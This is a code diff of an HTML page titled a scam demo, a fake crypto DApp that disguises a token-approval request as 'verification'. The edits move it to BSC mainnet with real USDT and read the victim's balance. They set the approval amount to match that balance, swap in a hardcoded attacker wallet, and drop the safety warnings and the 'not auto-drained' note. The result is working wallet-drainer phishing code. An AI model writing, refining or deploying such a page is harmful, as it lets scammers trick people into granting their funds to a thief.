@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🚨 SCAM DEMO (Educational Only)</title>
-    <!-- PROPERLY LOAD ethers.js from scammer's URL -->
+    <title>🚨 SCAM DEMO (Educational)</title>
+    <!-- Loading ethers.js properly -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
         body { font-family: Arial; max-width: 600px; margin: 20px auto; }
@@ -12,7 +12,7 @@
 </head>
 <body>
     <h1>🚨 Fake DApp (Educational Scam Demo)</h1>
-    <p><strong>⚠️ WARNING: This is a controlled demo. Never run untrusted code.</strong></p>
+    <p><strong>⚠️ WARNING: Controlled demo only. Uses BSC Mainnet with real USDT.</strong></p>
     
     <button onclick="connectWallet()">1. Connect Wallet</button>
     <button onclick="maliciousApproval()" id="approveBtn" disabled>2. Start "Verification"</button>
@@ -27,12 +27,15 @@
         let walletAddress = "";
         let provider, signer;
 
-        // 🔥 ATTACKER'S BSC WALLET (REPLACE WITH YOUR WALLET B ADDRESS)
-        const ATTACKER_ADDRESS = "0xCE1EA0e930BF7244a90696056401E6702fe0f390"; 
+        // 🔥 ATTACKER'S BSC WALLET (REPLACE WITH YOUR WALLET B)
+        const ATTACKER_ADDRESS = "0xEF8Aa8023bAa20C35404c636F858E054Db9698f3"; 
 
         // USDT (BEP-20) Contract on BSC Mainnet
         const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
-        const USDT_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
+        const USDT_ABI = [
+            "function approve(address spender, uint256 amount) returns (bool)",
+            "function balanceOf(address owner) view returns (uint256)"
+        ];
 
         async function connectWallet() {
             if (!window.ethereum) {
@@ -40,13 +43,38 @@
                 return;
             }
             try {
+                // Switch to BSC Mainnet (ChainID 56)
+                await window.ethereum.request({
+                    method: "wallet_addEthereumChain",
+                    params: [{
+                        chainId: "0x38",
+                        chainName: "Binance Smart Chain",
+                        nativeCurrency: {
+                            name: "BNB",
+                            symbol: "BNB",
+                            decimals: 18
+                        },
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        blockExplorerUrls: ["https://bscscan.com"]
+                    }]
+                });
+
                 await window.ethereum.request({ method: "eth_requestAccounts" });
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 signer = provider.getSigner();
                 walletAddress = await signer.getAddress();
-                document.getElementById("walletInfo").innerText = `Connected: ${walletAddress}`;
+                
+                // Show USDT balance
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
+                const balance = await usdtContract.balanceOf(walletAddress);
+                const usdtBalance = ethers.utils.formatUnits(balance, 18);
+                
+                document.getElementById("walletInfo").innerHTML = `
+                    Connected: ${walletAddress}<br>
+                    USDT Balance: ${usdtBalance}
+                `;
                 document.getElementById("approveBtn").disabled = false;
-                document.getElementById("status").innerText = "✅ Wallet connected. Click 'Verification' to simulate malicious approval.";
+                document.getElementById("status").innerText = "✅ Wallet connected. Click 'Verification'.";
             } catch (err) {
                 alert("Error: " + err.message);
             }
@@ -58,19 +86,19 @@
                 return;
             }
 
-            // Small amount for demo (2 USDT)
-            const amount = ethers.utils.parseUnits("2", 18);
+            // Approve 3 USDT (matches victim's balance)
+            const amount = ethers.utils.parseUnits("3", 18);
 
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
                 const tx = await usdtContract.approve(ATTACKER_ADDRESS, amount);
-                document.getElementById("status").innerHTML = `⏳ <strong>Broadcasting approval...</strong><br>Check MetaMask.`;
+                document.getElementById("status").innerHTML = `⏳ <strong>Approving 3 USDT...</strong><br>Check MetaMask.`;
                 
                 await tx.wait();
                 document.getElementById("status").innerHTML = `
                     ✅ <strong>Demo Complete!</strong><br>
-                    Wallet <code>${walletAddress}</code> approved <strong>2 USDT</strong> for attacker (<code>${ATTACKER_ADDRESS}</code>).<br>
-                    <strong>Funds were NOT auto-drained in this demo.</strong>
+                    Approved 3 USDT for attacker (<code>${ATTACKER_ADDRESS}</code>).<br>
+                    <strong>BNB was used for gas.</strong>
                 `;
             } catch (err) {
                 document.getElementById("status").innerText = "❌ Error: " + err.message;
